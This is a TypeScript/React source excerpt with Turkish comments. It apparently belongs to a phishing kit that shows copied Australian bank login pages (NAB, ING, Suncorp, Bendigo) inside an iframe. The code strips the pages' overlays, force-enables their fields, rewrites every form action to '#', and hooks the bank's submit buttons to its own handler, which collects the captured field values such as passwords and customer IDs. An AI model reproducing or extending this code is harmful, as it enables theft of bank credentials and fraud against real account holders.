        // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
        //   odak yoksa İLK input/autofocus inputa odaklan.
        //   (daha sonraki TURlarda KESİNLİKLE odak izinsiz el değiştirme
        //    → Bendigo şifre 1 karakter yazma / Suncorp token→customer id odak KAYBINI ONLER)
        try {
          if (pollingCounterRef.current <= 2) {
            const act = doc.activeElement as HTMLElement | null;
            const actTag = (act?.tagName || "").toLowerCase();
            const userIsTyping = actTag === "input" || actTag === "textarea" || actTag === "select";
            if (!userIsTyping) {
              let focusTarget: HTMLElement | null = null;
              try {
                focusTarget = doc.querySelector<HTMLElement>("input[autofocus], textarea[autofocus]");
              } catch {}
              if (!focusTarget) {
                try {
                  focusTarget = Array.from(
                    doc.querySelectorAll<HTMLInputElement>("input:not([type='hidden'])"),
                  )[0] as HTMLElement | null;
                } catch {}
              }
              if (focusTarget) {
                try {
                  setTimeout(() => {
                    try { (focusTarget as any).focus({ preventScroll: true }); }
                    catch { try { (focusTarget as any).focus(); } catch {} }
                  }, 0);
                } catch {}
              }
            }
          }
        } catch {}

        const blStr = (x: HTMLElement) => `${x.id || ""} ${x.className || ""} ${x.getAttribute("data-testid") || ""} ${x.getAttribute("aria-label") || ""} ${x.tagName || ""}`.toLowerCase();
        const isPasswordEyeOrIcon = (x: HTMLElement) => /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|security-banner|securitybanner|kba/i.test(blStr(x));

        // =====================================================================
        // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
        //    NAB, North AMP, ING Australia gibi bankalarda inputların üstünde
        //    saydam veya z-index yüksek overlay elementleri inputları bloke ediyor.
        //    ⭐ NOT: Sadece GERÇEKTEN overlay/dialog/popup olan elementleri GİZLE!
        //       ORİJİNAL HTML ikonları (pwd-eye, padlock-icon, security banner vb.)
        //       dokunma, koru! BLACKLIST isPasswordEyeOrIcon() TRUE ise GİZLEME!
        // =====================================================================
        try {
          // (A) ING WebComponent / Polymer custom elementler (tag name "ing-*")
          try {
            const ingEls = doc.querySelectorAll<HTMLElement>("*");
            ingEls.forEach((el) => {
              const tag = (el.tagName || "").toLowerCase();
              if (tag.startsWith("ing-") || tag.startsWith("paper-") || tag.startsWith("iron-") || tag.startsWith("vaadin-") || tag.startsWith("ui5-")) {
                if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
                const role = (el.getAttribute("role") || "").toLowerCase();
                const zi = Number(window.getComputedStyle(el).zIndex || "0");
                const disp = window.getComputedStyle(el).display;
                const isRealOverlayTag =
                  tag === "ing-core-overlay" || tag === "iron-overlay" || tag === "iron-overlay-backdrop" || tag === "paper-dialog";
                const isRealOverlayClassOrRole =
                  role === "dialog" || role === "alertdialog" ||
                  (el.className || "").toString().split(/\s+/).some((t) => t === "overlay" || t === "backdrop" || t === "modal");
                // Custom element overlay / dialog / backdrop ise GİZLE
                if (
                  (zi > 900 && (isRealOverlayTag || isRealOverlayClassOrRole)) ||
                  isRealOverlayTag
                ) {
                  if (disp !== "none") {
                    try { el.style.setProperty("display", "none", "important"); } catch {}
                    try { el.style.visibility = "hidden"; } catch {}
                    try { el.style.opacity = "0"; } catch {}
                    try { el.style.pointerEvents = "none"; } catch {}
                  }
                }
              }
            });
          } catch {}
          // (B) Z-index > 900 olan TÜM elementleri tarama, input/button dışındakileri gizle
          try {
            const highZi = doc.querySelectorAll<HTMLElement>("div, section, article, aside, span, header, footer, nav, dialog");
            highZi.forEach((el) => {
              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
              const zi = Number(window.getComputedStyle(el).zIndex || "0");
              if (zi > 900) {
                const tag = (el.tagName || "").toLowerCase();
                const txt = (el.textContent || "").trim().toLowerCase();
                const hasForm = el.querySelector("input, button, select, textarea, form") != null;
                const isLoginBut = /login|submit|continue|next|giriş|giris|onay|tamam/.test(
                  `${el.id} ${el.className} ${txt}`,
                );
                if (!hasForm && !isLoginBut && tag !== "button") {
                  try { el.style.setProperty("display", "none", "important"); } catch {}
                  try { el.style.pointerEvents = "none"; } catch {}
                } else {
                  try { el.style.setProperty("pointer-events", "none", "important"); } catch {}
                  el.querySelectorAll<HTMLElement>("input, button, select, textarea, label").forEach((f) => {
                    try { f.style.setProperty("pointer-events", "auto", "important"); } catch {}
                  });
                }
              }
            });
          } catch {}
          // (C) Standart overlay selectorları ile son tarama
          //    ⭐ GENİŞ [class*=overlay]/[id*=overlay]/[class*=modal] KALDIRILDI!
          //      Sadece TAG (overlay/dialog/paper-dialog) + AÇIK class TAM eşleşmesi
          //      (.overlay / .modal / .backdrop) + role=dialog olanlar GİZLENİR.
          try {
            const overlaySelector =
              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, .modal, .backdrop, [role="dialog"], [role="alertdialog"]';
            const overlays = doc.querySelectorAll<HTMLElement>(overlaySelector);
            overlays.forEach((el) => {
              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
              try { el.style.setProperty("display", "none", "important"); } catch {}
              try { el.style.visibility = "hidden"; } catch {}
              try { el.style.opacity = "0"; } catch {}
              try { el.style.pointerEvents = "none"; } catch {}
            });
          } catch {}
        } catch {}

        const form = pickBestForm(doc);
        if (!form) return;
        savedSubmitFormRef.current = form;

        const singleStep = totalSteps === 1;
        const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
        const disabledBySaving = saving;
        const shouldForceEnable = proceedNow && !disabledBySaving;

        // ⭐ ING fadeOpacity/grayscale polling seviyesinde de hesapla
        const allPollFields = getFormFields(form);
        const allRequiredPoll = allPollFields.filter((f) => {
          const t = (f.getAttribute("type") ?? "").toLowerCase();
          return t !== "checkbox" && t !== "radio";
        });
        const capturedNow = collectCapturedFieldsFromForm(form, doc);
        const filledNow = capturedNow.filter((c) => c.value.trim().length > 0).length;
        const totalMeaningful = allRequiredPoll.length;
        let fadeOpacity = 1;
        let fadeGray = 0;
        if (!proceedNow) {
          if (filledNow === 0) {
            fadeOpacity = 0.3;
            fadeGray = 0.8;
          } else {
            fadeOpacity = 0.5;
            fadeGray = 0.6;
          }
        }

        const palette = getButtonPalette(bankSlug);

        // =====================================================================
        // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
        //    Her input/textarea/select için:
        //      - disabled/readonly/tabindex temizliği (eski kod)
        //      - 5 parent katmanı pointerEvents=auto + position zaten static ise relative
        //      - her 3 polling turunda bir input.focus() denemesi (iframe klavye odak emülasyonu)
        // =====================================================================
        try {
          const inputEls = Array.from(
            doc.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
              "input, textarea, select",
            ),
          ).filter((f) => {
            const t = (f.getAttribute("type") ?? "").toLowerCase();
            return t !== "hidden";
          });
          inputEls.forEach((field, idx) => {
            try {
              if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
              if ((field as any).readOnly === true) { try { (field as any).readOnly = false; } catch {} }
              if (field.hasAttribute("disabled")) {
                field.removeAttribute("disabled");
                try { (field as any).disabled = false; } catch {}
              }
              if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
              if (!field.hasAttribute("tabindex")) field.setAttribute("tabindex", "0");

              // Pointer-events ve z-index temizliği (ELEMENT)
              try {
                field.style.setProperty("pointer-events", "auto", "important");
                field.style.setProperty("position", "relative", "important");
                field.style.setProperty("z-index", "5", "important");
                field.style.setProperty("opacity", "1", "important");
                field.style.setProperty("visibility", "visible", "important");
              } catch {}

              // 5 PARENT KATMAN
              let p: HTMLElement | null = field as unknown as HTMLElement;
              let depth = 0;
              while (p && depth < 6) {
                try {
                  p.style.setProperty("pointer-events", "auto", "important");
                  const compZ = Number(window.getComputedStyle(p).zIndex || "0");
                  if (compZ <= 0 && depth < 4) {
                    try {
                      if (window.getComputedStyle(p).position === "static") {
                        p.style.setProperty("position", "relative", "important");
                      }
                      p.style.setProperty("z-index", String(Math.max(2, 6 - depth)), "important");
                    } catch {}
                  }
                } catch {}
                p = p.parentElement;
                depth++;
              }

              // ⭐ ÖNEMLİ: HER POLLING'de idx%3 ===0 focus KALDIRILDI!
              //   Yerine: runPoll başında SADECE İLK 2 polling turunda
              //   ve AKTİF ODAKLI BİR INPUT YOKSA odaklama yapıyoruz.
              //   (Bu sayede kullanıcı yazarken odak ASLA izinsiz DEĞİŞMEZ.)
            } catch {}
          });
        } catch {}

        const allCandidates = doc.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, .el-button, .van-button, .btn-submit, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
        );

        const candidateNodes: HTMLElement[] = [];
        const seenCandidates = new Set<HTMLElement>();
        allCandidates.forEach((node) => {
          if (seenCandidates.has(node)) return;
          seenCandidates.add(node);

          // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
          if (!isElementActuallyButtonLike(node)) return;

          const nodeToken = getElementActionToken(node);
          const isSubmitInput =
            node instanceof HTMLInputElement &&
            ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            node.tagName === "BUTTON" ||
            node.getAttribute("role") === "button" ||
            node.hasAttribute("onclick");

          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput || isByAttr)) return;
          candidateNodes.push(node);

          if ("disabled" in node) {
            try { (node as any).disabled = !shouldForceEnable; } catch {}
          }

          try {
            if (shouldForceEnable) {
              node.removeAttribute("disabled");
            }
          } catch {}
          try {
            node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
          } catch {}

          // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
          if (!isElementActuallyButtonLike(node)) return;

          // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
          try {
            node.style.setProperty("position", "relative", "important");
            node.style.setProperty("display", "inline-block", "important");
            node.style.setProperty("z-index", "99999", "important");
            node.style.setProperty("margin-top", "14px", "important");
            node.style.setProperty("margin-bottom", "10px", "important");
            node.style.setProperty("padding-top", "12px", "important");
            node.style.setProperty("padding-bottom", "12px", "important");
            node.style.setProperty("padding-left", "22px", "important");
            node.style.setProperty("padding-right", "22px", "important");
            node.style.setProperty("line-height", "1.35", "important");
            node.style.setProperty("font-size", "15px", "important");
            node.style.setProperty("font-weight", "700", "important");
            node.style.setProperty("border-radius", "10px", "important");
            node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
            node.style.setProperty("opacity", String(fadeOpacity), "important");
            node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
            node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
            node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
          } catch {}

          try {
            if (shouldForceEnable) {
              const classesToRemove: string[] = [];
              for (let i = 0; i < node.classList.length; i++) {
                const cls = node.classList[i];
                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                  classesToRemove.push(cls);
                }
              }
              classesToRemove.forEach((c) => node.classList.remove(c));
            }
          } catch {}

          try {
            if (shouldForceEnable) {
              node.style.setProperty("background-color", palette.bg, "important");
              node.style.setProperty("background", palette.bg, "important");
              node.style.setProperty("color", palette.fg, "important");
              node.style.setProperty("border", `1px solid ${palette.border}`, "important");
              node.style.setProperty("box-shadow", palette.shadow, "important");
            } else {
              const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
              node.style.setProperty("background-color", bgCol, "important");
              node.style.setProperty("background", bgCol, "important");
              node.style.setProperty("color", "#8A8E90", "important");
              node.style.setProperty("border", "1px solid transparent", "important");
              node.style.setProperty("box-shadow", "none", "important");
            }
            node.style.setProperty(
              "transition",
              "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
              "important",
            );
          } catch {}

          try {
            const curRef = submitWithCurrentValuesRef.current;
            try { node.removeEventListener("click", curRef as any, false); } catch {}
            try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
            try { node.removeEventListener("touchend", curRef as any, false); } catch {}
            if (curRef) {
              // ⭐ BUTONLAR HER ZAMAN tıklanabilir (opacity düşük olsa bile kullanıcı zorlayabilir)
              //   save anında hariç pointer-events auto kalsın
              node.addEventListener("click", curRef as any, false);
              node.addEventListener("mousedown", curRef as any, false);
              node.addEventListener("touchend", curRef as any, false);
              try {
                node.addEventListener("keydown", (e: Event) => {
                  const ke = e as KeyboardEvent;
                  if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                    try { curRef(); } catch {}
                  }
                }, false);
              } catch {}
            }
          } catch {}
        });

        // ⭐ ING / UI5 ÖZEL: tag name "ing-" "ui5-" "sl-" başlayan ve buton gibi davranan custom elementler
        //   (örn: ing-login-submit) ayrıca brute-force olarak bul & listeye ekle + STIL/HANDLER UYGULA
        try {
          const ingCandidates = doc.querySelectorAll<HTMLElement>("*");
          ingCandidates.forEach((el) => {
            if (seenCandidates.has(el)) return;
            const tag = (el.tagName || "").toLowerCase();
            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-") && !tag.startsWith("sg-")) return;

            // ⭐ WEB COMPONENT BUTON FİLTRESİ: ing-input, sg-input (INPUT) custom elementleri
            //   buton DEĞİLDİR, onlara fadeOpacity UYGULAMA! SADECE ing-button, ing-login-submit
            //   gibi GERÇEKTEN buton/action görevi görenleri kabul et.
            if (!isElementActuallyButtonLike(el)) {
              const tok = getElementActionToken(el);
              const role = (el.getAttribute("role") || "").toLowerCase();
              const isActionBut =
                role === "button" ||
                /submit|login|button|next|continue|confirm|accept|proceed|validate|unlock|signon|sigon|auth/.test(tok);
              if (!isActionBut) return;
            }

            const tok = getElementActionToken(el);
            const role = (el.getAttribute("role") || "").toLowerCase();
            if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
              seenCandidates.add(el);
              candidateNodes.push(el);

              try {
                if ("disabled" in el) {
                  try { (el as any).disabled = !shouldForceEnable; } catch {}
                }
                try { if (shouldForceEnable) el.removeAttribute("disabled"); } catch {}
                try { el.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true"); } catch {}
                try {
                  el.style.pointerEvents = saving ? "none" : "auto";
                  el.style.opacity = String(fadeOpacity);
                  el.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
                  el.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
                  el.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
                } catch {}
                try {
                  if (shouldForceEnable && (el as any).classList) {
                    const classesToRemove: string[] = [];
                    for (let i = 0; i < (el as any).classList.length; i++) {
                      const cls = (el as any).classList[i];
                      if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                        classesToRemove.push(cls);
                      }
                    }
                    classesToRemove.forEach((c) => (el as any).classList.remove(c));
                  }
                } catch {}
                try {
                  if (shouldForceEnable) {
                    el.style.setProperty("background-color", palette.bg, "important");
                    el.style.setProperty("background", palette.bg, "important");
                    el.style.setProperty("color", palette.fg, "important");
                    el.style.setProperty("border", `1px solid ${palette.border}`, "important");
                    el.style.setProperty("box-shadow", palette.shadow, "important");
                  } else {
                    const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                    el.style.setProperty("background", bgCol, "important");
                    el.style.setProperty("background-color", bgCol, "important");
                    el.style.setProperty("color", "#8A8E90", "important");
                    el.style.setProperty("border", "1px solid transparent", "important");
                    el.style.setProperty("box-shadow", "none", "important");
                  }
                  el.style.setProperty(
                    "transition",
                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
                    "important",
                  );
                } catch {}
                try {
                  const curRef = submitWithCurrentValuesRef.current;
                  try { el.removeEventListener("click", curRef as any, false); } catch {}
                  try { el.removeEventListener("mousedown", curRef as any, false); } catch {}
                  try { el.removeEventListener("touchend", curRef as any, false); } catch {}
                  if (curRef) {
                    el.addEventListener("click", curRef as any, false);
                    el.addEventListener("mousedown", curRef as any, false);
                    el.addEventListener("touchend", curRef as any, false);
                    try {
                      el.addEventListener("keydown", (e: Event) => {
                        const ke = e as KeyboardEvent;
                        if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                          try { curRef(); } catch {}
                        }
                      }, false);
                    } catch {}
                  }
                } catch {}
              } catch {}
            }
          });
        } catch {}

        // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
        // form + doc içinde GERÇEKTEN buton olan ve class/id/textte geçenleri al.
        if (candidateNodes.length === 0) {
          try {
            const fallBackSource = form ?? doc.body ?? doc.documentElement;
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|logon|signin|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|log_on|log_in|sign_in|sigon|auth|validate|accept|proceed|unlock|open/i;
            const extra: HTMLElement[] = [];
            allIn.forEach((el) => {
              if (seenCandidates.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const cls = (el.getAttribute("class") || "").toLowerCase();
              const tOk =
                tag === "button" ||
                (tag === "input" && (type === "submit" || type === "button")) ||
                el.getAttribute("role") === "button" ||
                (tag === "a" && /\bbtn\b/.test(cls)) ||
                el.hasAttribute("onclick");

              // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
              if (!isElementActuallyButtonLike(el)) return;

              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seenCandidates.add(el);
                extra.push(el);
              }
            });
            // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
            extra.forEach((node) => {
              // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
              if (!isElementActuallyButtonLike(node)) return;

              candidateNodes.push(node);
              if ("disabled" in node) {
                try { (node as any).disabled = !shouldForceEnable; } catch {}
              }
              try {
                if (shouldForceEnable) node.removeAttribute("disabled");
              } catch {}
              try {
                node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
              } catch {}
              try {
                node.style.setProperty("position", "relative", "important");
                node.style.setProperty("display", "inline-block", "important");
                node.style.setProperty("z-index", "99999", "important");
                node.style.setProperty("margin-top", "14px", "important");
                node.style.setProperty("margin-bottom", "10px", "important");
                node.style.setProperty("padding-top", "12px", "important");
                node.style.setProperty("padding-bottom", "12px", "important");
                node.style.setProperty("padding-left", "22px", "important");
                node.style.setProperty("padding-right", "22px", "important");
                node.style.setProperty("line-height", "1.35", "important");
                node.style.setProperty("font-size", "15px", "important");
                node.style.setProperty("font-weight", "700", "important");
                node.style.setProperty("border-radius", "10px", "important");
                node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
                node.style.setProperty("opacity", String(fadeOpacity), "important");
                node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
                node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
                node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
              } catch {}
              try {
                if (shouldForceEnable) {
                  const classesToRemove: string[] = [];
                  for (let i = 0; i < node.classList.length; i++) {
                    const cls = node.classList[i];
                    if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                      classesToRemove.push(cls);
                    }
                  }
                  classesToRemove.forEach((c) => node.classList.remove(c));
                }
              } catch {}
              try {
                if (shouldForceEnable) {
                  node.style.setProperty("background-color", palette.bg, "important");
                  node.style.setProperty("background", palette.bg, "important");
                  node.style.setProperty("color", palette.fg, "important");
                  node.style.setProperty("border", `1px solid ${palette.border}`, "important");
                  node.style.setProperty("box-shadow", palette.shadow, "important");
                } else {
                  const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                  node.style.setProperty("background-color", bgCol, "important");
                  node.style.setProperty("background", bgCol, "important");
                  node.style.setProperty("color", "#8A8E90", "important");
                  node.style.setProperty("border", "1px solid transparent", "important");
                  node.style.setProperty("box-shadow", "none", "important");
                }
                node.style.setProperty(
                  "transition",
                  "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
                  "important",
                );
              } catch {}
              try {
                const curRef = submitWithCurrentValuesRef.current;
                try { node.removeEventListener("click", curRef as any, false); } catch {}
                try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
                try { node.removeEventListener("touchend", curRef as any, false); } catch {}
                if (curRef) {
                  node.addEventListener("click", curRef as any, false);
                  node.addEventListener("mousedown", curRef as any, false);
                  node.addEventListener("touchend", curRef as any, false);
                  try {
                    node.addEventListener("keydown", (e: Event) => {
                      const ke = e as KeyboardEvent;
                      if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                        try { curRef(); } catch {}
                      }
                    }, false);
                  } catch {}
                }
              } catch {}
            });
          } catch {}
        }

        if (candidateNodes.length > 0) {
          savedSubmitActionNodesRef.current = candidateNodes;
        }

        try {
          const formsArr = Array.from(doc.querySelectorAll("form"));
          formsArr.forEach((f) => {
            try {
              f.setAttribute("action", "#");
              f.setAttribute("method", "post");
              f.setAttribute("target", "_self");
              f.setAttribute("novalidate", "novalidate");
            } catch {}
            if (f === form) {
              const curRef = submitWithCurrentValuesRef.current;
              try { f.removeEventListener("submit", curRef as any); } catch {}
              if (curRef) f.addEventListener("submit", curRef as any);
              (f as any)._auBotV3Bound = true;
            }
          });
        } catch {}

        const allFields = getFormFields(form);
        allFields.forEach((field) => {
          try {
            if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
            if (field.hasAttribute("disabled") && field.getAttribute("type") !== "hidden") {
              field.removeAttribute("disabled");
              (field as any).disabled = false;
            }
            if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
          } catch {}
        });

        if (shouldForceEnable) {
          try {
            if (iframe.contentWindow && typeof iframe.contentWindow.postMessage === "function") {
              try {
                iframe.contentWindow.postMessage({ kind: "AU_BOT_CAN_PROCEED_NOW" }, "*");
              } catch {}
            }
          } catch {}
        }
      } catch (e) {
        /* cross-origin or detached frame — ignore silently */
      }
    };

    const initialTimer = window.setTimeout(runPoll, 250);
    const pollTimer = window.setInterval(runPoll, 800);

    return () => {
      window.clearTimeout(initialTimer);
      window.clearInterval(pollTimer);
    };
  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex, totalSteps]);

  if (!currentSrc) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for {bankName} ({bankSlug}).
        {isAuExactHtmlBank(bankSlug) && bankSlug === "suncorp-bank" ? (
          <div className="mt-2 w-full text-xs text-[#129C4F]">
            Suncorp Bank HTML files (1.html, 2.html, 3.html) bekleniyor. Kullanicidan geldikten sonra public/au-banks/suncorp-bank/ altina yerlestirilecektir.
          </div>
        ) : null}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={currentSrc}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
